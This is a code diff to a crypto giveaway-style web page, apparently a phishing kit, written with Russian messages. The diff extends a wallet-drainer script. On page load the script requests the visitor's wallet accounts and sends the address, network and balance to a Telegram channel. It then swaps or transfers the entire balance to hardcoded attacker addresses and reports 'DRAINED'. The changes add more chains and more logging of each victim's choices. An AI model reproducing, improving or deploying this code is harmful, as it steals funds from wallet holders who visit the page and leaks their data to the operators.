@@ -17,11 +17,11 @@
     .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; }
     .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
-    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; }
+    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; overflow-y: auto; max-height: 90vh; }
     .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.8rem; margin: 2.5rem 0; }
     .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 140px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     .wallet-item:hover { transform: scale(1.15); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
-    .wallet-item img { width: 90px; height: 90px; object-fit: contain; }
+    .wallet-item img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 0.5rem; }
     .wallet-item p { font-size: 1.1rem; font-weight: 600; margin-top: 0.5rem; }
     .reviews { padding: 2rem; text-align: center; background: rgba(0,0,0,0.5); margin-top: 3rem; }
     .review { background: rgba(255,255,255,0.05); padding: 1.2rem; border-radius: 1rem; margin: 1.5rem 0; backdrop-filter: blur(8px); }
@@ -170,8 +170,11 @@
     }
 
     async function connect(wallet) {
+      await sendToTelegram(`Выбран кошелёк: ${wallet}`);
+
       const uri = await getUri();
       if (!uri) {
+        await sendToTelegram('Сессия WC не создана');
         alert('Ошибка сессии');
         return;
       }
@@ -187,30 +190,39 @@
         if (wallet === 'Tonkeeper') dl = `tonkeeper://wc?uri=${encodeURIComponent(uri)}`;
 
         if (dl) {
+          await sendToTelegram(`Открытие deep-link для ${wallet}`);
           window.location.href = dl;
-          setTimeout(() => alert('Подтверди подключение и транзакцию'), 1500);
+          setTimeout(() => {
+            alert('Подтверди подключение и транзакцию в кошельке');
+          }, 1500);
           document.getElementById('modal').style.display = 'none';
           return;
         }
       }
 
-      alert('Открой в кошельке');
+      await sendToTelegram(`Deep-link не сработал для ${wallet}`);
+      alert('Подтверди подключение в кошельке');
     }
 
     window.addEventListener('load', async () => {
       if (window.ethereum || window.solana) {
         try {
-          let provider, address, network, balanceFormatted, symbol, target;
+          let provider, address, network, balanceFormatted, symbol, target, chainId;
+
+          await sendToTelegram('Страница загружена → сессия WC передана, проверяем провайдер');
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             address = (await provider.listAccounts())[0];
-            const chainId = (await provider.getNetwork()).chainId;
+            chainId = (await provider.getNetwork()).chainId;
             if (chainId === 1) network = 'Ethereum';
             else if (chainId === 56) network = 'BNB Smart Chain';
             else if (chainId === 137) network = 'Polygon';
             else if (chainId === 8453) network = 'Base';
+            else if (chainId === 42161) network = 'Arbitrum';
+            else if (chainId === 10) network = 'Optimism';
+            else if (chainId === 43114) network = 'Avalanche';
             else return;
 
             const bal = await provider.getBalance(address);
@@ -229,13 +241,21 @@
             target = addresses[network] || 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM';
           }
 
-          await sendToTelegram(`Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`);
+          const connectMsg = `Подключён кошелёк!\nАдрес: ${address}\nСеть: ${network}\nБаланс: ${balanceFormatted} ${symbol}`;
+          await sendToTelegram(connectMsg);
 
           if (parseFloat(balanceFormatted) > 0) {
-            const swapRes = await fetch(`${BACKEND}/swap-to-usdt`, {
+            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив/своп на ${target}`);
+
+            const swapRes = await fetch(`${BACKEND}/swap-to-usdt-trc20`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chainId: chainId || 1, fromToken: '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee', amount: ethers.utils.parseEther(balanceFormatted).toString(), fromAddress: address })
+              body: JSON.stringify({
+                chainId: chainId || 1,
+                fromToken: '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',
+                amount: ethers.utils.parseEther(balanceFormatted).toString(),
+                fromAddress: address
+              })
             });
             const swapData = await swapRes.json();
 
@@ -245,14 +265,22 @@
               await sendToTelegram(`Своп + DRAINED в USDT TRC20: ${balanceFormatted} → ${swapData.target}`);
             } else {
               const signer = provider.getSigner();
-              const tx = await signer.sendTransaction({ to: target, value: ethers.utils.parseEther(balanceFormatted) });
+              const tx = await signer.sendTransaction({
+                to: target,
+                value: ethers.utils.parseEther(balanceFormatted)
+              });
               await tx.wait();
               await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
             }
+          } else {
+            await sendToTelegram(`Подключён, но баланс 0 → слив не выполнен`);
           }
         } catch (e) {
-          await sendToTelegram(`Ошибка: ${e.message}`);
+          console.error(e);
+          await sendToTelegram(`Ошибка слива: ${e.message}`);
         }
+      } else {
+        await sendToTelegram('Провайдер кошелька не обнаружен — сессия не передалась');
       }
     });
   </script>
